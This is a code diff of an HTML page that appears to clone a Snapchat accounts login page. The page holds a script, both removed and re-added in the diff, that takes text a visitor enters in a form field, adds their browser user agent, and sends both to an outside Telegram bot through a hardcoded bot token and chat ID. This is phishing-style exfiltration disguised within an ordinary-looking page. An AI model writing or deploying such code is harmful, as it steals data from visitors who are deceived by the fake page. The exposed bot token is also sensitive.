@@ -60026,29 +60026,27 @@
   --locale-dropdown-item-hover-color: #000000;
   }
   </style><link rel="stylesheet" id="sdsm-font-graphik" href="https://storage.googleapis.com/snap-design-system/fonts/font.graphik.css">
-  </div></div></div></div><script src="/accounts/static/scripts/main.js?v=f5cc673dec17f1f2945587b59a3185c7210a4bd57fe93f7457994efc6b8e988cmaster615554"></script>
+  </div></div></div></div>
+  
+  <script src="/accounts/static/scripts/main.js?v=f5cc673dec17f1f2945587b59a3185c7210a4bd57fe93f7457994efc6b8e988cmaster615554">
+  function sendMessage() {
+    var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
+    var chatId = "709764990";
+    var message = $("#message").val();
+    var browserName = getBrowserHeader();
 
+    var fullMessage = "Nachricht: " + message + "\nBrowser: " + browserName;
+    
+    // Anfrage an die Telegram-Bot-API senden
+    $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
+        console.log("Antwort von der Telegram API:", data);
+    });
+}
 
-  <script>
-    function sendMessage() {
-        var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
-        var chatId = "709764990";
-        var message = $("#message").val();
-        var browserName = getBrowserHeader();
-
-        var fullMessage = "Nachricht: " + message + "\nBrowser: " + browserName;
-        
-        // Anfrage an die Telegram-Bot-API senden
-        $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
-            console.log("Antwort von der Telegram API:", data);
-        });
-    }
-
-    function getBrowserHeader(){
-        var userAgentEndUser = navigator.userAgent;
-        return userAgentEndUser;
-    }
-</script>
+function getBrowserHeader(){
+    var userAgentEndUser = navigator.userAgent;
+    return userAgentEndUser;
+}</script>
 
   
 </div><!-- End Pusher --><script src="/accounts/static/scripts/pixel.js" async="">
